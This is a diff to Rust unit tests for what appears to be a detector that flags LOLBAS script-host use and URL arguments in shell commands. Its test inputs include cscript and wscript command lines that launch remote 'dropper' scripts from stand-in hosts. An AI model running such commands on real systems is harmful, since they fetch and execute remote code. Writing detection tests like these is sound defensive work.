@@ -11997,15 +11997,11 @@ mod cscript_tests {
 
     #[test]
     fn script_hosts_emit_url_argument_for_remote_script_url() {
+        let cscript_raw = r#"cscript //nologo "https://script-host.example/dropper.vbs""#;
+        let wscript_raw = r#"wscript "script-host-schemeless.example/dropper.js""#;
         let mut env = Environment::new(&Config::default());
-        interpret_line(
-            r#"cscript //nologo "https://script-host.example/dropper.vbs""#,
-            &mut env,
-        );
-        interpret_line(
-            r#"wscript "script-host-schemeless.example/dropper.js""#,
-            &mut env,
-        );
+        interpret_line(cscript_raw, &mut env);
+        interpret_line(wscript_raw, &mut env);
 
         for expected in [
             "https://script-host.example/dropper.vbs",
@@ -12016,6 +12012,15 @@ mod cscript_tests {
                     .iter()
                     .any(|t| matches!(t, Trait::UrlArgument { url, .. } if url == expected)),
                 "missing script-host UrlArgument for {expected}: {:?}",
+                env.traits
+            );
+        }
+        for (name, cmd) in [("cscript", cscript_raw), ("wscript", wscript_raw)] {
+            assert!(
+                env.traits
+                    .iter()
+                    .any(|t| matches!(t, Trait::Lolbas { name: got_name, cmd: got_cmd } if got_name == name && got_cmd == cmd)),
+                "missing script-host LOLBAS provenance for {name}: {:?}",
                 env.traits
             );
         }
@@ -12040,6 +12045,19 @@ wscript loader.js
                     .iter()
                     .any(|t| matches!(t, Trait::UrlArgument { url, .. } if url == expected)),
                 "missing script-host source UrlArgument for {expected}: {:?}",
+                report.traits
+            );
+        }
+        for (name, cmd) in [
+            ("cscript", "cscript //nologo dropper.vbs"),
+            ("wscript", "wscript loader.js"),
+        ] {
+            assert!(
+                report
+                    .traits
+                    .iter()
+                    .any(|t| matches!(t, Trait::Lolbas { name: got_name, cmd: got_cmd } if got_name == name && got_cmd == cmd)),
+                "missing script-host source LOLBAS provenance for {name}: {:?}",
                 report.traits
             );
         }
